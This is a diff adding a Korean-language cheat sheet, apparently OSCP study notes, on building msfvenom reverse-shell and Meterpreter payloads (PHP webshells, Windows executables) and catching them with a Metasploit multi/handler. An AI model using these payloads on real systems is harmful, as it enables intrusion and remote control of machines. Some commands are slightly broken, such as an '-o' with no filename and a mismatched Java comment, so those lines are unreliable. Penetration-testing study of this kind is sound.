@@ -1,0 +1,59 @@
+# msfvenom
+
+- Meterpreter 등 리버스 셸 페이로드를 php·exe·asp·raw 등 원하는 형식(-f)으로 생성하는 msfvenom, 그리고 결과를 받을 handler 세팅까지.
+- 웹쉘(shell.php) 업로드나 실행 파일 심기 전에, handler와 같은 LHOST/LPORT로 페이로드를 만들 때.
+- metasploit-framework 설치 필요, payload마다 지원 형식·프로토콜이 달라 --list로 확인하며, OSCP 시험에서는 Metasploit 사용 머신이 1대로 제한된다.
+
+## 개요
+
+`msfvenom`은 payload를 생성하는 도구이다. "어떤 언어/어떤 연결로 셸을 띄울지"를 정하는 것이 핵심이다.
+
+## 기본 명령 구조
+
+```bash
+apt install -y metasploit-framework
+
+msfvenom [options] -p <payload> LHOST=<IP> LPORT=<PORT>
+```
+
+| 옵션    | 설명                               |
+| ------- | ---------------------------------- |
+| `-p`    | 사용할 payload 모듈                |
+| `-f`    | 결과 파일 형식 (raw, php, js, ...) |
+| `-e`    | 추가로 사용할 encoding             |
+| `-o`    | 결과 파일을 특정 경로에 저장       |
+| `-list` | 사용 가능한 payload 목록           |
+
+## payload 선택 예시
+
+```bash
+# PHP webshell (웹서버에 업로드)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php
+
+# PHP reverse_php (파일 업로드에 유리)
+msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php
+
+# Java / Python 등
+msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
+
+# windows reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f exe -o
+```
+
+## handler 세팅 (공격자 측)
+
+```bash
+msfconsole
+msf6 > use exploit/multi/handler
+msf6 > set payload php/reverse_php
+msf6 > set LHOST 10.10.10.10
+msf6 > set LPORT 4444
+msf6 > exploit
+```
+
+## 주의
+
+- payload마다 지원하는 연결 프로토콜이 다르다. `--list`으로 확인한다.
+- 결과물을 타깃에 업로드할 때는 `file` 타입으로 저장한다.
+- OSCP 시험에서는 독립 머신 1대에만 Metasploit을 사용할 수 있다.
+- `exploit`를 실행하기 전에 `show options`로 현재 세팅을 확인한다.
